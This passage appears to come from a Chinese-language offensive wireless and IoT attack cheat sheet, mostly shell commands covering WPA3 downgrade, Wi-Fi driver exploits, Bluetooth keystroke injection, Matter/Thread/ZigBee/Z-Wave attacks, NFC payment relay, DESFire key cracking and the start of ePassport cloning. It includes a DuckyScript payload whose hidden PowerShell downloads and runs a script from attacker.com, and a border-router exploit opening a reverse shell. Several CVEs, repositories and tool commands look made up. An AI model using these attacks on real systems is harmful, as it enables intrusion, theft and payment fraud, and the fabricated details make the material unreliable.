airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa3_cap mon0

# 使用 FragAttack 2026 扩展工具
git clone https://github.com/vanhoefm/fragattacks
cd fragattacks/research
# 2026 扩展: 针对 WPA3 Transition Mode 的聚合帧测试
python3 fragtest.py --test wpa3-amsdu --iface wlan0 --bssid AA:BB:CC:DD:EE:FF

# 利用 WPA3 碎片化注入
# 步骤 1: 获取目标网络信标
# 步骤 2: 构造恶意 A-MSDU 帧
# 步骤 3: 在 4-way handshake 完成后注入
python3 fragattack.py wlan0 --ap AA:BB:CC:DD:EE:FF \
  --test wpa3-amsdu-inject \
  --payload "dns-spoof" \
  --target-ip 192.168.1.100
```

#### Dragonfly SAE 握手降级攻击 (2026)

```bash
# CVE-2026-28391: WPA3 Dragonfly SAE 降级到 WPA2
# 攻击原理: 伪造 Beacon/Probe Response 强制客户端回退 WPA2
# 利用 WPA3 Transition Mode 的设计缺陷

# 步骤 1: 扫描附近 WPA3 网络
airodump-ng mon0 --band abg --wps --encrypt wpa3

# 步骤 2: 使用 DragonSlayer 2026 工具
git clone https://github.com/security-research/dragonslayer-2026
cd dragonslayer-2026

# 步骤 3: 创建降级攻击的恶意 AP
# 发送伪造 Beacon 帧，声明仅支持 WPA2
python3 dragonslayer.py \
  --interface wlan0 \
  --bssid AA:BB:CC:DD:EE:FF \
  --ssid "Target_WPA3" \
  --downgrade-to WPA2 \
  --capture-handshake \
  --output wpa3_downgraded.pcap

# 步骤 4: 捕获降级后的 WPA2 4-way handshake
# 客户端被欺骗后使用 WPA2 PSK 握手
# 使用 hashcat 破解捕获的 PMKID/handshake

# 提取 PMKID (如果支持)
hcxdumptool -o wpa3_downgrade.pcapng -i mon0 \
  --filterlist_ap=targets.txt \
  --enable_status=3

# 转换为 hashcat 格式
hcxpcapngtool -o hash.hc22000 -E essidlist wpa3_downgrade.pcapng

# 破解
hashcat -m 22000 -a 3 hash.hc22000 ?l?l?l?l?l?l?l?l
```

#### CVE-2026-* WiFi 驱动漏洞集群

```bash
# 2026 年 WiFi 驱动漏洞集群

# CVE-2026-21453: Linux mac80211 堆溢出
# 影响: 内核 5.15~6.8 的 mac80211 子系统
# 触发: 特制 Beacon 帧中的扩展 IE 字段
# 利用: 内核 RCE → 权限提升
# 修复: 内核 6.8.1+

# 检测漏洞
uname -r
# 如果版本在 5.15 到 6.8 之间, 受影响

# 漏洞验证 PoC
git clone https://github.com/exploit-db/CVE-2026-21453
cd CVE-2026-21453
# 编译内核模块
make
# 发送恶意 Beacon 帧
python3 poc.py --interface mon0 --target-mac AA:BB:CC:DD:EE:FF

# CVE-2026-18902: Qualcomm ath12k 固件整数溢出
# 影响: 使用 QCN9274/QCN6274 芯片组的 WiFi 7 设备
# 触发: 特制 MLO 关联请求帧
# 利用: 固件 RCE → 基带控制

# CVE-2026-31027: Intel AX411/AX211 驱动 UAF
# 影响: Intel WiFi 6E/7 网卡 iwlwifi 驱动
# 触发: 特制 Probe Response 帧处理
# 利用: 本地提权 / 信息泄露

# 使用 WiFi 驱动 Fuzzer
git clone https://github.com/0x90/wifi-fuzzer-2026
cd wifi-fuzzer-2026
# 针对特定芯片组生成模糊测试用例
python3 wifuzz.py --driver ath12k --interface wlan0 \
  --mutation-rate 0.3 --coverage-guided \
  --output-dir /tmp/wifuzz_results
```

#### WiFi 7 (802.11be) 攻击面

```bash
# WiFi 7 802.11be 新增攻击面分析
# 新特性 = 新攻击面:
# - 320 MHz 信道带宽
# - 4K QAM 调制
# - Multi-Link Operation (MLO)
# - Multi-RU (Resource Unit) 分配
# - 增强 OFDMA
# - 4096-QAM 调制

# 802.11be 帧结构分析
# 使用最新版 Wireshark 4.4+ 解析 802.11be 帧
tshark -r wifi7_capture.pcapng \
  -Y "wlan.radio.phy==802.11be" \
  -T fields \
  -e frame.number \
  -e wlan.ssid \
  -e wlan.bssid \
  -e wlan_radio.11be.mlo \
  -e wlan_radio.channel_width

# MLO (Multi-Link Operation) 攻击
# MLO 允许设备同时在多个频段通信
# 攻击面: 链路同步、密钥派生、帧序列号管理

# MLO 链路劫持 PoC
git clone https://github.com/wifi7-research/mlo-attack
cd mlo-attack

# 步骤 1: 扫描 WiFi 7 MLO 网络
python3 mlo_scanner.py --interface mon0 --band 6ghz

# 步骤 2: 识别 MLO 链路配置
# 目标 AP 可能有 2.4GHz + 5GHz + 6GHz 三条链路
python3 mlo_analyzer.py --pcap wifi7_mlo.pcapng

# 步骤 3: MLO 链路注入攻击
# 在非主链路上注入欺骗帧
# 利用 MLO 帧序列号不同步
python3 mlo_inject.py \
  --interface wlan0 \
  --target-bssid AA:BB:CC:DD:EE:FF \
  --link-id 2 \
  --inject-deauth \
  --target-client CC:DD:EE:FF:00:11

# 6GHz 频谱扫描与攻击
# 6GHz 频段 (5.925-7.125 GHz) 需要特殊硬件
# 支持 6GHz 的网卡: Intel AX411/AX211, Qualcomm NFA765, MT7925

# 扫描 6GHz 频段
iw dev wlan0 scan freq 5935 5955 5975 5995 6015 6035 6055 6075 \
  6095 6115 6135 6155 6175 6195 6215 6235 6255 6275 6295 6315 \
  6335 6355 6375 6395 6415 6435 6455 6475 6495 6515 6535 6555 \
  6575 6595 6615 6635 6655 6675 6695 6715 6735 6755 6775 6795 \
  6815 6835 6855 6875 6895 6915 6935 6955 6975 6995 7015 7035 \
  7055 7075 7095 7115

# 使用专用 6GHz 扫描工具
git clone https://github.com/6ghz-tools/6ghz-scanner
cd 6ghz-scanner
python3 sixghz_scan.py --interface wlan0 --region US

# PMF (Protected Management Frames) 绕过 2026
# CVE-2026-35421: WPA3 PMF 实现缺陷
# 某些芯片组在 PMF 协商阶段存在竞态条件
# 攻击者可在 PMF 启用前注入管理帧

# PMF 绕过测试
python3 pmf_bypass.py \
  --interface mon0 \
  --bssid AA:BB:CC:DD:EE:FF \
  --client CC:DD:EE:FF:00:11 \
  --inject-deauth \
  --race-window 100 \
  --verbose
```

---

### §2026-2: 2026 蓝牙安全深度攻击

#### BLE 5.4 / 6.0 攻击面

```bash
# BLE 5.4 新特性攻击面
# - 加密广告数据 (Encrypted Advertising Data)
# - 广告编码选择 (Advertising Coding Selection)
# - 周期性广告响应 (Periodic Advertising Response)
# - 带响应的周期性广告 (PAwR)

# BLE 6.0 (2026年发布) 新特性攻击面
# - 信道探测 (Channel Sounding) - 精确测距
# - 决策型广告过滤 (Decision-Based Advertising Filtering)
# - 广告商监控 (Advertiser Monitoring)
# - 等时适配扩展 (Isochronous Adaptation Extension)

# 使用 nRF52840 DK 嗅探 BLE 5.4/6.0
# 新固件: Sniffer v4.1.0+ 支持 BLE 5.4
git clone https://github.com/nordicsemi/nrf-sniffer
cd nrf-sniffer
# 刷写 BLE 5.4 嗅探固件
python3 nrf_sniffer_ble.py --extcap-interface COM_PORT \
  --firmware sniffer_5_4.hex

# 使用 Wireshark 分析 BLE 5.4 流量
# 过滤 BLE 5.4 新特性
tshark -r ble54_capture.pcapng \
  -Y "btle.advertising_header.pdu_type == 0x05" \
  -T fields -e btle.advertiser_address -e btle.data

# BLE 信道探测攻击 (Channel Sounding Attack)
# 信道探测用于精确距离测量, 攻击者可:
# 1. 相位操纵攻击: 改变信号相位伪造距离
# 2. 反射攻击: 放大/延迟信号
# 3. 时间戳操纵: 修改 ToF 时间戳

# 使用 HackRF One 进行相位操纵
python3 phase_manipulation.py \
  --frequency 2402000000 \
  --sample-rate 8000000 \
  --phase-shift 45 \
  --output cs_attack.iq

hackrf_transfer -t cs_attack.iq -f 2402000000 -s 8000000 -a 1 -x 30
```

#### LE Audio / LC3 编解码器注入攻击

```bash
# LE Audio 攻击面
# LC3 (Low Complexity Communication Codec) 编解码器
# 攻击向量: 编解码器缓冲区溢出、音频帧注入、同步攻击

# CVE-2026-17823: LC3 解码器堆溢出
# 影响: 使用 liblc3 1.0.x 的蓝牙耳机和助听器
# 触发: 特制 LC3 音频帧, 帧大小字段溢出

# 漏洞验证
git clone https://github.com/audioresearch/lc3-exploit-2026
cd lc3-exploit-2026

# 生成恶意 LC3 帧
python3 lc3_fuzzer.py \
  --target decoder \
  --overflow-type heap \
  --frame-size 0xFFFF \
  --output malicious.lc3

# 通过 Bluetooth LE Audio 注入
python3 le_audio_inject.py \
  --target AA:BB:CC:DD:EE:FF \
  --service CIS \
  --payload malicious.lc3

# LE Audio CIS (Connected Isochronous Stream) 劫持
# CIS 用于低延迟音频传输
# 攻击: 同步到 CIS 流, 注入恶意音频帧

# 步骤 1: 嗅探 CIS 连接建立
# 使用 Ubertooth One 或 nRF52840
ubertooth-btle -f -c captured_cis.pcap

# 步骤 2: 分析 CIS 参数
python3 analyze_cis.py captured_cis.pcap

# 步骤 3: 注入恶意音频帧
python3 cis_inject.py \
  --sync-to-cis \
  --target-master AA:BB:CC:DD:EE:FF \
  --payload "malicious_audio.raw"
```

#### 2026 BlueDucky / BT Classic 配对降级

```bash
# BlueDucky 2026: 增强版蓝牙 HID 攻击
# 基于 CVE-2023-45866 的蓝牙键盘注入
# 2026 新增: 多设备并发攻击、HID 描述符混淆、延迟注入

git clone https://github.com/pentestfunctions/blueducky-2026
cd blueducky-2026

# 扫描附近蓝牙设备
python3 blueducky.py --scan

# 多目标并发 BadUSB 攻击
python3 blueducky.py \
  --targets targets.txt \
  --payload payloads/reverse_shell.txt \
  --concurrent 5 \
  --delay 2000

# 自定义 DuckyScript 2026 语法
cat > payload.txt << 'EOF'
DELAY 1000
GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 500
STRING $c=(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1');IEX $c
ENTER
EOF

# BT Classic 配对降级攻击 (2026)
# CVE-2026-41289: 蓝牙经典 SSP 降级
# 强制目标使用 Legacy PIN 配对代替 Secure Simple Pairing

git clone https://github.com/bt-classic-downgrade/bt-downgrade-2026
cd bt-downgrade-2026

# 步骤 1: 扫描蓝牙经典设备
hcitool scan
hcitool inq --flush

# 步骤 2: 获取远程设备支持的功能
# 检查是否支持 SSP (Secure Simple Pairing)
python3 bt_feature_scan.py --target AA:BB:CC:DD:EE:FF

# 步骤 3: 强制降级到 Legacy PIN 配对
# 伪造 IO 能力声明 (NoInputNoOutput)
python3 bt_downgrade.py \
  --target AA:BB:CC:DD:EE:FF \
  --force-legacy-pairing \
  --pin-brute-force \
  --pin-list pins.txt

# 蓝牙 PIN 暴力破解加速
# 常见 PIN: 0000, 1234, 1111, 9999
python3 bt_pin_cracker.py \
  --target AA:BB:CC:DD:EE:FF \
  --wordlist /usr/share/wordlists/bt_pin.txt \
  --threads 8
```

#### 蓝牙 Mesh 网络攻击

```bash
# 蓝牙 Mesh 网络攻击 (2026)
# 蓝牙 Mesh 用于智能照明、楼宇自动化
# 攻击面: 配置模型、网络密钥、IV 索引、分割/重组

# 蓝牙 Mesh 网络嗅探
# 使用 nRF52840 + 自定义固件
git clone https://github.com/bt-mesh-research/mesh-sniffer-2026
cd mesh-sniffer-2026

# 刷写 Mesh 嗅探固件
python3 programmer.py --board nrf52840_dk --firmware mesh_sniffer.hex

# 捕获 Mesh 网络流量
python3 mesh_sniffer.py --channel 37 --output mesh_capture.pcap

# Mesh 网络密钥恢复
# 如果获取到设备, 可提取 NetKey/AppKey
# 通过 SWD 调试接口读取 nRF52 系列 Flash
openocd -f interface/jlink.cfg -f target/nrf52.cfg
# 在 OpenOCD 控制台
# flash read_bank 0 mesh_dump.bin 0 0x100000

# 分析 Mesh 密钥
python3 mesh_key_extract.py mesh_dump.bin

# Mesh 网络重放攻击
# 使用获取的密钥注入 Mesh 消息
python3 mesh_replay.py \
  --net-key 0123456789ABCDEF0123456789ABCDEF \
  --app-key FEDCBA9876543210FEDCBA9876543210 \
  --src 0x0001 \
  --dst 0xC000 \
  --opcode 0x8202 \
  --payload "ON"

# Mesh IV 索引耗尽攻击
# 蓝牙 Mesh 使用 32-bit IV 索引
# 快速递增 IV 索引可耗尽 IV 更新空间
# 导致网络密钥失效
python3 mesh_iv_drain.py \
  --net-key 0123456789ABCDEF0123456789ABCDEF \
  --target-network 0x1234
```

#### 蓝牙 AoA/AoD 定位欺骗 & Apple Find My 网络投毒

```bash
# 蓝牙 AoA/AoD (Angle of Arrival/Departure) 定位欺骗
# BLE 5.1+ 引入的 CTE (Constant Tone Extension) 用于测向
# 攻击: 伪造 CTE 信号, 欺骗定位系统

# 使用 HackRF One 生成伪造 CTE 信号
python3 cte_spoof.py \
  --frequency 2402000000 \
  --antenna-array 4x4 \
  --fake-angle 45 \
  --output cte_fake.iq

hackrf_transfer -t cte_fake.iq -f 2402000000 -s 8000000 -a 1 -x 40

# Apple Find My 网络投毒攻击 (2026)
# 原理: 利用 Find My 网络的众包定位机制
# 攻击: 伪造设备位置信标, 投毒定位数据库

# 使用 ESP32 模拟 AirTag 信标
git clone https://github.com/malicious/findmy-poison-2026
cd findmy-poison-2026

# 编译 ESP32 固件
idf.py set-target esp32
idf.py build
idf.py -p /dev/ttyUSB0 flash

# 配置伪造信标参数
cat > config.json << 'EOF'
{
  "advertisement_key": "0123456789ABCDEF0123456789ABCDEF",
  "fake_location": {"lat": 37.7749, "lon": -122.4194},
  "broadcast_interval_ms": 2000,
  "rolling_proximity_identifier": true,
  "tx_power": 4
}
EOF

# 部署投毒信标
python3 deploy_poison.py --config config.json --duration 3600

# 检测 Find My 网络投毒
# 使用 Mac 或 iPhone 监测异常信标
# 分析蓝牙广告数据中的模式
python3 findmy_detector.py \
  --interface mon0 \
  --scan-duration 300 \
  --alert-threshold 50
```

---

### §2026-3: 2026 ZigBee / Z-Wave / Matter 智能家居攻击

#### Matter 1.4 协议攻击

```bash
# Matter 1.4 (2026年发布) 新攻击面
# Matter 基于 IP (Thread/WiFi/Ethernet) 的统一智能家居协议
# 新特性攻击面:
# - 增强设备类型 (机器人吸尘器、洗衣机、能源管理)
# - 增强 OTA 更新机制
# - 增强场景和自动化
# - 增强安全调试 (Secure Debug)

# Matter 设备发现与枚举
git clone https://github.com/project-chip/connectedhomeip
cd connectedhomeip/examples/chip-tool

# 使用 chip-tool 发现 Matter 设备
./chip-tool discover commissionables \
  --discovery-timeout 30

# 枚举 Matter 设备端点
./chip-tool descriptor read parts-list 1 1 \
  --commissioner-nodeid 1000

# Matter 配网攻击 (Commissioning Attack)
# CVE-2026-33891: Matter 配网过程 PASE 降级
# PASE (Password Authenticated Session Establishment) 可被降级
# 攻击者拦截配网码 (Manual Pairing Code) 或 QR 码

# 步骤 1: 嗅探 Matter 配网流量
# Matter 使用 mDNS 进行设备发现
# 使用 avahi 或自定义工具嗅探
tcpdump -i eth0 -n port 5353 -w matter_mdns.pcap

# 步骤 2: 分析 Matter 配网码
# 配网码格式: 数字 11 位 (如 34970112332)
# 或 QR 码包含: Version, Discriminator, Passcode, VendorID, ProductID

# 步骤 3: 暴力破解 Matter 配网码
# Passcode 范围: 0-99999998 (默认: 20202021)
python3 matter_passcode_brute.py \
  --discriminator 3840 \
  --pin-code 20202021 \
  --device-ip 192.168.1.100 \
  --wordlist matter_default_pins.txt

# Matter ACL 权限提升
# CVE-2026-22719: Matter 访问控制列表绕过
# 低权限节点可提升到管理员权限
python3 matter_acl_escalate.py \
  --device-ip 192.168.1.100 \
  --subject-node 1001 \
  --target-privilege admin \
  --exploit-type CVE-2026-22719

# Matter OTA 供应链攻击
# 拦截 Matter OTA 更新, 注入恶意固件
# Matter OTA 使用 HTTPS + 固件签名验证
# 但中间人可降级到旧版本 (回滚攻击)
python3 matter_ota_rollback.py \
  --device-ip 192.168.1.100 \
  --old-firmware firmware_v1.2.3.ota \
  --force-downgrade
```

#### Thread 边界路由器攻击

```bash
# Thread 边界路由器 (Border Router) 攻击
# Thread 是 Matter 底层网络协议 (基于 6LoWPAN + IEEE 802.15.4)
# 边界路由器连接 Thread 网络和 WiFi/以太网

# Thread 网络扫描
# 使用 nRF52840 DK 或 cc2531 USB 嗅探
git clone https://github.com/openthread/ot-br-posix

# 使用 OpenThread 嗅探器
ot-ctl discover
ot-ctl scan
# 输出: PAN ID, Channel, Network Name, Extended PAN ID

# Thread 网络密钥获取
# 方法 1: 物理访问设备, 通过 JTAG/SWD 提取
# 方法 2: 利用 Thread Commissioning 漏洞

# CVE-2026-19873: OpenThread 边界路由器 RCE
# 影响: OpenThread 边界路由器 2024.x ~ 2026.1
# 触发: 特制 IPv6 数据包到边界路由器
# 利用: 栈溢出 → 远程代码执行

# 漏洞利用
python3 thread_br_exploit.py \
  --target 192.168.1.1 \
  --port 49153 \
  --payload reverse_shell \
  --callback-ip 192.168.1.100 \
  --callback-port 4444

# Thread 网络主动加入攻击
# 如果获取到网络密钥, 可主动加入 Thread 网络
ot-ctl dataset set active 0E080000000000010000000300001335060004001
ot-ctl dataset commit active
ot-ctl ifconfig up
ot-ctl thread start

# 加入后扫描网络拓扑
ot-ctl neighbor list
ot-ctl router table
ot-ctl child list
```

#### ZigBee 3.0 Touchlink 攻击

```bash
# ZigBee 3.0 Touchlink 近距离配网攻击
# Touchlink 用于近距离 (< 10cm) 配网 ZigBee 设备
# 攻击: 在 Touchlink 过程中窃取网络密钥

# 使用 ZigBee 嗅探硬件
# 推荐: CC2531 USB + zigbee2mqtt 固件
# 或: nRF52840 + ZigBee 嗅探固件

# 刷写 ZigBee 嗅探器固件
git clone https://github.com/zigbee-alliance/zigbee-sniffer
cd zigbee-sniffer/cc2531
make && make flash

# 使用 Wireshark 分析 ZigBee 流量
# 过滤 ZigBee 协议
tshark -r zigbee_capture.pcap \
  -Y "zbee_nwk" \
  -T fields \
  -e zbee_nwk.src \
  -e zbee_nwk.dst \
  -e zbee_aps.counter \
  -e zbee_aps.cluster

# ZigBee 3.0 Touchlink 攻击工具
git clone https://github.com/zigbee-attack/touchlink-attack-2026
cd touchlink-attack-2026

# 步骤 1: 扫描 Touchlink 兼容设备
python3 touchlink_scan.py --channel 11-26

# 步骤 2: 发起 Touchlink 配网请求
# 在 Touchlink 扫描阶段窃取网络密钥
python3 touchlink_steal.py \
  --channel 15 \
  --target-pan 0x1234 \
  --output stolen_keys.json

# 步骤 3: 使用窃取密钥加入网络
python3 zigbee_join.py \
  --channel 15 \
  --pan-id 0x1234 \
  --network-key stolen_keys.json \
  --extended-pan-id AA:BB:CC:DD:EE:FF:00:11

# ZigBee 重放攻击
# 捕获 ZigBee 命令并重放
python3 zigbee_replay.py \
  --pcap zigbee_commands.pcap \
  --filter-cluster 0x0006 \
  --replay-count 5

# ZigBee 网络密钥暴力破解
# 已知: 某些厂商使用默认或可预测的网络密钥
# 默认密钥: ZigBeeAlliance09 (ZigBee 联盟默认)
python3 zigbee_key_brute.py \
  --pan-id 0x1234 \
  --wordlist zigbee_default_keys.txt \
  --channel 15
```

#### Z-Wave S2 降级攻击

```bash
# Z-Wave Security 2 (S2) 降级到 S0
# CVE-2026-40125: Z-Wave S2 密钥协商降级
# S2 提供更强的加密, 但可被降级到 S0 (弱加密)

# 使用 Z-Wave 嗅探硬件
# 推荐: Z-Wave.Me Z-Stick Gen5/Gen7
# 或: Silicon Labs ACC-UZB3

# 刷写 Z-Wave 嗅探器固件
git clone https://github.com/zwave-js/zwave-sniffer
cd zwave-sniffer

# 使用 Z-Wave SDR 嗅探
# 使用 RTL-SDR 或 HackRF One 在 868/908 MHz 嗅探
rtl_sdr -f 868400000 -s 1024000 -g 40 zwave_capture.bin

# 使用 Universal Radio Hacker (URH) 分析 Z-Wave
# 导入 Z-Wave 信号并解调
urh

# Z-Wave S2 降级攻击实现
git clone https://github.com/zwave-exploits/zwave-s2-downgrade
cd zwave-s2-downgrade

# 步骤 1: 监听 Z-Wave 配对过程
# Z-Wave 配对使用 S2 或 S0 安全类
python3 zwave_pair_listen.py \
  --frequency 868400000 \
  --duration 120

# 步骤 2: 注入降级请求
# 在 S2 密钥协商阶段注入 S0 请求
python3 zwave_s2_downgrade.py \
  --target-node 0x05 \
  --controller-node 0x01 \
  --force-s0

# 步骤 3: 捕获 S0 加密密钥
# S0 使用较弱的密钥派生
# 密钥材料可通过无线嗅探捕获
python3 zwave_s0_crack.py \
  --capture s0_pairing.cap \
  --output s0_key.txt

# Z-Wave 网络密钥提取
# 物理访问 Z-Wave 控制器
# 通过 UART/SPI 调试接口提取 NVM
python3 zwave_nvm_extract.py \
  --port /dev/ttyUSB0 \
  --baudrate 115200 \
  --output nvm_dump.bin

# 分析 NVM 提取密钥
python3 zwave_key_parser.py nvm_dump.bin
```

#### 智能家居网关攻击 & 跨协议桥接攻击

```bash
# 2026 智能家居网关攻击
# 目标: Home Assistant、SmartThings、HomeKit、Aqara 等网关
# 攻击面: Web 管理界面、API 接口、MQTT 代理、ZigBee/Z-Wave 协调器

# 扫描智能家居网关
nmap -p 80,443,8080,8123,1883,8883,5683,5684 192.168.1.0/24

# Home Assistant 安全审计
# 默认端口: 8123
# 检查 API 端点
curl -s http://192.168.1.100:8123/api/ | jq .
curl -s http://192.168.1.100:8123/api/states | jq .
curl -s http://192.168.1.100:8123/api/services | jq .

# MQTT 代理攻击 (Mosquitto/EMQX)
# 默认端口: 1883 (无加密), 8883 (TLS)
# 匿名访问检查
mosquitto_sub -h 192.168.1.100 -t "#" -v
mosquitto_pub -h 192.168.1.100 -t "zigbee2mqtt/0x1234/set" -m '{"state":"ON"}'

# WebSocket API 攻击
# 许多网关使用 WebSocket 进行实时通信
# 使用 wscat 连接
wscat -c ws://192.168.1.100:8123/api/websocket
# 发送认证消息
# {"type": "auth", "access_token": "leaked_token"}

# Matter Bridge 跨协议桥接攻击
# Matter Bridge 连接 ZigBee/Z-Wave 设备到 Matter 网络
# 攻击: 通过 Matter 侧控制 ZigBee/Z-Wave 设备

# 枚举 Matter Bridge 代理的设备
python3 matter_bridge_enum.py \
  --bridge-ip 192.168.1.100 \
  --matter-node 2000

# 跨协议命令注入
# 通过 Matter API 发送恶意 ZigBee 命令
# 利用 Bridge 的协议转换缺陷
python3 cross_protocol_inject.py \
  --source Matter \
  --target ZigBee \
  --bridge-ip 192.168.1.100 \
  --zigbee-endpoint 0x0B \
  --cluster 0x0006 \
  --command "toggle" \
  --exploit-type CVE-2026-27834

# 智能家居网关固件分析
# 提取固件
binwalk -e gateway_firmware.bin
# 分析文件系统
find _gateway_firmware.bin.extracted/ -name "*.conf" -o -name "*.key" -o -name "*.pem"
# 搜索硬编码凭证
grep -r "password\|secret\|token\|api_key" _gateway_firmware.bin.extracted/
```

---

### §2026-4: 2026 NFC / RFID 高级攻击

#### NFC 中继攻击 2026

```bash
# NFC 中继攻击 2026 增强版
# 中继攻击扩展作用距离, 将读卡器信号中继到远程真实卡
# 2026 新进展: 5G/WiFi 6E 低延迟中继、多卡并发中继、长距离中继

# CVE-2026-44102: EMV 非接触支付中继时间窗口扩展
# 利用支付终端宽松的超时配置
# 中继距离可达 10km+

# NFC 中继攻击工具链 2026
git clone https://github.com/nfc-relay/nfc-relay-2026
cd nfc-relay-2026

# 攻击者 A (靠近读卡器/终端)
# 使用 Proxmark3 RDV4 作为 Reader 端
pm3 --> hf 14a relay -e -s -t 192.168.1.100 -p 9999

# 攻击者 B (靠近目标卡/手机)
# 使用 Proxmark3 Easy 或 Flipper Zero 作为 Card 端
pm3 --> hf 14a relay -e -r -t 192.168.1.200 -p 9999

# 使用 NFCGate 增强中继 (Android)
# 安装 NFCGate 2026 版本
# Reader 模式: 捕获读卡器磁场
# Tag 模式: 模拟目标卡响应
adb install nfcgate-2026.apk
# 配置中继隧道: WiFi Direct 或 5G 蜂窝网络

# 长距离 NFC 中继 (2026 新方法)
# 使用 SDR 放大 NFC 13.56MHz 信号
# 接收端: 高增益天线 + LNA 放大器
# 发射端: 功率放大器 + 环形天线

# HackRF One + 外置放大器配置
# 接收 NFC 读卡器信号
hackrf_transfer -r nfc_relay_rx.iq -f 13560000 -s 8000000 -a 0 -l 40 -g 40

# 分析并重放信号
python3 nfc_signal_relay.py \
  --input nfc_relay_rx.iq \
  --amplify 20 \
  --output nfc_relay_tx.iq

# 发送放大后的信号到目标卡
hackrf_transfer -t nfc_relay_tx.iq -f 13560000 -s 8000000 -a 1 -x 40
```

#### ISO 14443 / ISO 15693 协议漏洞 (2026)

```bash
# ISO 14443 协议漏洞深度分析
# ISO 14443-A: 用于 MIFARE、DESFire、NFC 支付卡
# ISO 14443-B: 用于中国身份证、生物特征护照
# ISO 15693: 用于图书馆标签、工业 NFC

# ISO 14443-A 反冲突阶段攻击
# 利用反冲突 (Anti-collision) 阶段的时间侧信道
# 提取完整 UID 而不触发卡的安全机制

# 使用 Proxmark3 进行 UID 暴力枚举
pm3 --> hf 14a info
pm3 --> hf 14a reader
# 如果卡支持 Random UID, 每次读取显示不同 UID

# CVE-2026-37219: ISO 14443-A 级联级别 UID 泄露
# 某些卡在级联选择 (Cascade Level) 响应中泄露完整 UID
# 即使启用了 Random UID
pm3 --> hf 14a raw -c -s -b 7 93 20
# 分析响应中的 UID 字节

# ISO 15693 标签攻击
# ISO 15693 用于长距离 (1m+) HF RFID, 安全性弱
# 常见标签: NXP ICODE SLIX, STMicroelectronics ST25DV

# 枚举 ISO 15693 标签
pm3 --> hf 15 reader
pm3 --> hf 15 info
pm3 --> hf 15 dump

# ISO 15693 标签复制
# 读取所有块
pm3 --> hf 15 readmulti
# 写入到空白标签
pm3 --> hf 15 restore

# 利用 ISO 15693 AFI (Application Family Identifier) 绕过
# 某些门禁系统只检查 AFI, 不验证 UID
# 修改 AFI 可绕过应用过滤
pm3 --> hf 15 writeafi -d 0x00

# ISO 15693 标签模拟 (Flipper Zero 2026 固件)
# 使用 Flipper Zero 模拟 ISO 15693 标签
# 支持: ICODE SLIX, ST25DV, Tag-it HF-I
```

#### Proxmark3 RDV4 2026 新固件 & Flipper Zero 2026

```bash
# Proxmark3 RDV4 2026 新固件功能
# 固件版本: Iceman Firmware v4.18931+ (2026)
# 新增功能:
# - BLE 5.4 嗅探支持 (实验性)
# - WiFi 6GHz 信标扫描 (实验性)
# - FeliCa 加密卡破解增强
# - MIFARE DESFire EV3 安全审计
# - 自动协议识别 AI 引擎

# 更新 Proxmark3 RDV4 固件
git clone https://github.com/RfidResearchGroup/proxmark3
cd proxmark3
git checkout iceman-v4.18931
make clean && make -j4
./pm3-flash-all

# 启动 Proxmark3 客户端
pm3

# 2026 新命令: 自动攻击模式
pm3 --> auto

# 2026 新命令: AI 协议识别
pm3 --> hf tune
pm3 --> hf ai detect

# 2026 新命令: DESFire EV3 审计
pm3 --> hf mfdes audit --ev3

# Flipper Zero 2026 固件 (Xtreme Firmware 2026)
# 新增功能:
# - NFC 中继模式 (需两块 Flipper Zero)
# - Sub-GHz 扩展频段 (300-348 MHz, 387-464 MHz, 779-928 MHz)
# - BLE Spam 2026 增强版
# - 红外学习增强 (空调/电视万能遥控)
# - GPIO 扩展: 支持 nRF24, CC1101 扩展模块

# 更新 Flipper Zero 固件
git clone https://github.com/Flipper-Xtreme/Xtreme-Firmware
cd Xtreme-Firmware
git checkout 2026-release
./fbt updater_package
# 通过 qFlipper 更新

# 使用 Flipper Zero 2026 的高级功能
# Sub-GHz 暴力破解 Rolling Code
# 影响: 车库门、卷帘门、汽车遥控钥匙
# 使用 CC1101 扩展模块 + 外置天线
# Sub-GHz -> Read -> 捕获遥控信号 -> Bruteforce

# Flipper Zero 2026 BLE Spam 增强
# 支持 50+ 种设备类型广播
# 苹果设备弹窗攻击 (Apple TV, AirPods, AirTag, HomePod 等)
# 安卓 Fast Pair 弹窗攻击
# Windows Swift Pair 弹窗攻击
```

#### MIFARE DESFire EV3 破解

```bash
# MIFARE DESFire EV3 安全分析 (2026)
# DESFire EV3 是 NXP 最新一代非接触式智能卡
# 安全性: AES-128, 3DES, 3K3DES
# 2026 年新发现: EV3 随机数生成器可预测性

# CVE-2026-50384: MIFARE DESFire EV3 RNG 偏差
# DESFire EV3 的硬件随机数生成器 (TRNG) 存在统计偏差
# 可预测性攻击: 多轮认证后预测后续随机数
# 影响: 密钥派生过程中的随机数可被预测

# EV3 卡识别
pm3 --> hf 14a info
# 输出: MIFARE DESFire EV3
# ATQA: 03 44
# SAK: 20

# EV3 应用枚举
pm3 --> hf mfdes lsapp
# 列出所有应用 ID (AID)
pm3 --> hf mfdes getfiles --aid 123456
# 列出指定应用的文件

# EV3 认证协议分析
# DESFire EV3 使用 AES 认证
# 认证格式: Authenticate(KeyNo, RandomB_encrypted)
# 攻击: 如果 RNG 可预测, 可预计算认证响应

# EV3 侧信道攻击
# 使用 ChipWhisperer 进行功耗分析
git clone https://github.com/newaetech/chipwhisperer
cd chipwhisperer

# 连接 DESFire EV3 卡
# 使用 Proxmark3 作为通信接口
# 捕获认证过程中的功耗轨迹
python3 cw_capture_desfire.py \
  --target desfire_ev3 \
  --samples 10000 \
  --output desfire_ev3_traces.npy

# 差分功耗分析 (DPA) 提取 AES 密钥
python3 cw_analyze_dpa.py \
  --traces desfire_ev3_traces.npy \
  --algorithm AES128 \
  --target-byte 0 \
  --output aes_key_candidates.txt

# EV3 应用密钥暴力破解
# 如果获取到认证挑战-响应对
# 可离线暴力破解应用密钥
python3 desfire_ev3_auth_crack.py \
  --challenge 1122334455667788 \
  --response AABBCCDDEEFF0011 \
  --key-type AES128 \
  --wordlist /usr/share/wordlists/desfire_keys.txt
```

#### 生物特征护照克隆

```bash
# 2026 生物特征护照 (ePassport) 克隆攻击
# 电子护照使用 ICAO 9303 标准
# 芯片: ISO 14443-B 或 ISO 14443-A
# 安全: BAC (Basic Access Control) / EAC (Extended Access Control) / SAC (Supplemental Access Control)

# 护照信息提取
# 使用 Proxmark3 或 ACR122U 读取护照芯片

# 步骤 1: 获取 MRZ (Machine Readable Zone)
# MRZ 格式 (两行):
